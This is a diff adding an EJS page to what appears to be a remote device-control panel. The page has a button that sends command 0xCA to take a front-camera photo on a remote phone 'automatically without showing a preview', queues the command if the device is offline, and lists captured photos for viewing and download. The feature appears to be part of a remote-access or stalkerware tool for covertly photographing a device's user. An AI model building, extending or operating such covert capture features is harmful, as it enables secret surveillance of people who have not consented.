@@ -1,0 +1,117 @@
+<div class="ui segment">
+    <div>
+        <button onclick="takePhoto(this)" class="ui red left labeled icon button">
+            <i class="camera icon"></i>
+            Take Front Camera Photo
+        </button>
+    </div>
+
+    <div class="ui info message" style="margin-top: 20px;">
+        <div class="header">Front Camera Photo Instructions</div>
+        <ul class="list">
+            <li>Click "Take Front Camera Photo" to capture a photo using the device's front camera</li>
+            <li>The photo will be taken automatically without showing a preview</li>
+            <li>Photo will appear in the list below when capture completes</li>
+            <li>Make sure camera permission is granted on the device</li>
+        </ul>
+    </div>
+
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% if (pageData && pageData.length > 0) { 
+                pageData.forEach((item) => { 
+                    let date = new Date(item.time);
+            %>
+            <tr>
+                <td class="collapsing"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                <td><%= item.originalName || 'front_camera_photo.jpg' %></td>
+                <td class="collapsing"><%= item.size ? (item.size / 1024).toFixed(2) + ' KB' : 'Unknown' %></td>
+                <td class="collapsing">
+                    <div class="ui buttons">
+                        <a href="<%= item.path %>" target="_blank" class="ui button blue">
+                            <i class="eye icon"></i> View
+                        </a>
+                        <div class="or"></div>
+                        <a href="<%= item.path %>" download="<%= item.originalName || 'front_camera_photo.jpg' %>"
+                            class="ui positive button">
+                            <i class="download icon"></i> Download
+                        </a>
+                    </div>
+                </td>
+            </tr>
+            <% }); 
+            } else { %>
+            <tr>
+                <td colspan="4" class="center aligned">
+                    <div class="ui message">
+                        <p>No front camera photos yet. Take a photo to see it here.</p>
+                    </div>
+                </td>
+            </tr>
+            <% } %>
+        </tbody>
+    </table>
+
+    <script>
+        function takePhoto(element) {
+            console.log('Take photo button clicked');
+            $(element).addClass('loading');
+            $(element).prop('disabled', true);
+            
+            // Verify baseURL is set
+            if (!baseURL) {
+                console.error('baseURL is not defined!');
+                showNotification('#f03434', 'Error: baseURL not defined');
+                $(element).removeClass('loading');
+                $(element).prop('disabled', false);
+                return;
+            }
+            
+            console.log('Sending camera command 0xCA to:', baseURL + '/0xCA');
+            
+            // Send command: 0xCA
+            sendCommand('0xCA', {}, (error, message) => {
+                console.log('Camera command response:', { error, message });
+                
+                if (error) {
+                    console.error('Camera command error:', error);
+                    setTimeout(() => {
+                        showNotification('#f03434', 'Error: ' + error);
+                        $(element).removeClass('loading');
+                        $(element).prop('disabled', false);
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+                        $(element).prop('disabled', false);
+                        
+                        if (message === 'Requested' || message === false || message === 'Command queued (device is offline)') {
+                            showNotification('#2ecc71', 'Front camera photo requested! Check back in a few seconds for the result.');
+                            // Reload page after a delay to show new photo
+                            setTimeout(() => {
+                                window.location.reload();
+                            }, 5000);
+                        } else {
+                            showNotification('#2ecc71', message || 'Front camera photo requested!');
+                            // Still reload after delay to check for new photos
+                            setTimeout(() => {
+                                window.location.reload();
+                            }, 5000);
+                        }
+                    }, 300);
+                }
+            });
+        }
+    </script>
+
+</div>
+
+
